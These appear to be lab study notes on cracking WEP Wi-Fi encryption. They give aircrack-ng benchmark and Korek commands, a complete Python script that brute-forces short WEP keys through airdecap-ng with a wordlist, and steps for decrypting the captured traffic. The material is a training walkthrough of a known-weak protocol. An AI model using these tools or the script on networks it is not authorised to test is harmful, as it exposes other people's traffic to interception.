# Chain #24: Additional WEP Cracking

Short purpose: explore **extra ways to crack WEP**, including benchmarking, Korek cracking using IVs, and a Python-based **offline dictionary attack** leveraging `airdecap-ng`. Reinforces how weak and outdated WEP encryption truly is.

---

## Key terms

- **IV (Initialization Vector)** — the per-packet random value that weakens WEP’s RC4 implementation.
- **Korek method** — advanced WEP cracking algorithm in `aircrack-ng` using statistical key byte recovery.
- **airdecap-ng** — decrypts packets using a provided key; can be used for brute-force verification.
- **Dictionary attack** — testing many possible keys until a decryption works.
- **Hex key** — 10-character hexadecimal string representing a 5-byte ASCII WEP key.

---

## Step-by-step workflows

### 1) Benchmarking CPU with aircrack-ng

```bash
aircrack-ng -S
```

- **`-S`**: runs internal benchmark mode.    
- **Purpose**: measures cracking speed (keys per second).
- **Output**: `1628.101 k/s` → your CPU can test ~1,628 keys/sec.
- **Use case**: helps estimate how long brute-force or dictionary cracking will take.

---

### 2) Korek WEP cracking from IVs

```bash
aircrack-ng -K HTB.ivs
```

- **`-K`**: activates Korek statistical method (default is PTW).
- **`HTB.ivs`**: file containing only IVs (collected via `airodump-ng --ivs`).
- **Process**:
    - Reads IVs.
    - Calculates key candidates via Korek attacks.
    - Displays probability votes for each byte.
- **Result**: once IVs are sufficient, output shows:
    ```
    KEY FOUND! [ AB:C7:7F:3A:03:D0:AF:DA:F6:8D:A5:E2:C7 ]
    Decrypted correctly: 100%
    ```
- **Note**: requires thousands of IVs; the more, the better accuracy.

---

### 3) Offline brute-force cracking with Python + airdecap-ng

Used when few packets are available — instead of cracking with `aircrack-ng`, test many keys with `airdecap-ng`.

#### a) Python brute-force script explanation

```python
import sys, binascii, re
from subprocess import Popen, PIPE
import time

start_time = time.time()
cap_file = '/opt/WEP-01.cap'
wordlist_path = '/opt/1000000-password-seclists.txt'

# Load password list
with open(wordlist_path, 'r') as f:
    wordlist = f.readlines()

for ln, word in enumerate(wordlist, start=1):
    key = re.sub(r'\W+', '', word)  # Clean word
    if len(key) != 5:
        continue
    hex_key = binascii.hexlify(key.encode('utf-8'))
    print(f"{ln}: Trying Key: {key} Hex: {hex_key}")

    # Run airdecap-ng with this key
    p = Popen(['/usr/bin/airdecap-ng', '-w', hex_key, cap_file], stdout=PIPE)
    output = p.stdout.read().decode('utf-8')

    # Check success condition
    if int(output.split('\n')[5][-1]) > 0:
        print(f"Success! WEP key found: {key}")
        print(f"Total time: {time.time() - start_time:.6f} seconds")
        sys.exit(0)

print("No WEP key found")
```

#### b) Explanation line-by-line

- **Imports**: subprocess (run airdecap), binascii (convert to hex), regex (clean strings), sys/time.    
- **cap_file**: captured WEP data file.
- **wordlist_path**: text file with possible passwords.
- **Filter**: only 5-character words (standard ASCII WEP keys).
- **Conversion**: converts ASCII → hex (e.g., `'cheek'` → `'636865656b'`).
- **Testing**: runs `airdecap-ng -w <hex_key> <cap_file>`.
- **Success check**: if any packets decrypt, the key is correct.
- **Output**: prints key + runtime and exits.

#### Example run

```bash
python3 bruteforce.py
```

Output snippet:

```
49972: Trying Key: b'cheek' Hex: b'636865656b'
Success! WEP key found: b'cheek'
Total time: 6.088396 seconds
```

---

### 4) Decrypting captured data with the discovered key

```bash
airdecap-ng -w 636865656b WEP-01.cap
```

- **`-w`**: specify the key (hex format).
- **`WEP-01.cap`**: input capture.
- **Result**: `Number of decrypted WEP packets > 0` confirms success.
- **Generates**: new file, e.g., `WEP-01-dec.cap` containing plaintext frames.
- **Next step**: open in Wireshark to view decrypted ARP, ICMP, etc.

---

## Quick reference block

```bash
# Benchmark performance
aircrack-ng -S

# Crack WEP using Korek method
aircrack-ng -K <file.ivs>

# Python offline brute-force (airdecap)
python3 bruteforce.py

# Decrypt packets with found key
airdecap-ng -w <hex_key> <capture.cap>
```

---

## Summary (one-paragraph)

These advanced WEP cracking approaches demonstrate multiple weak points: the **Korek method** efficiently uses IVs, while an **offline Python + airdecap brute-force** can recover short ASCII keys even with minimal data. Once found, the key easily decrypts captured frames for full network inspection. Modern standards like WPA2/WPA3 completely mitigate such weaknesses — reinforcing why WEP should never be used.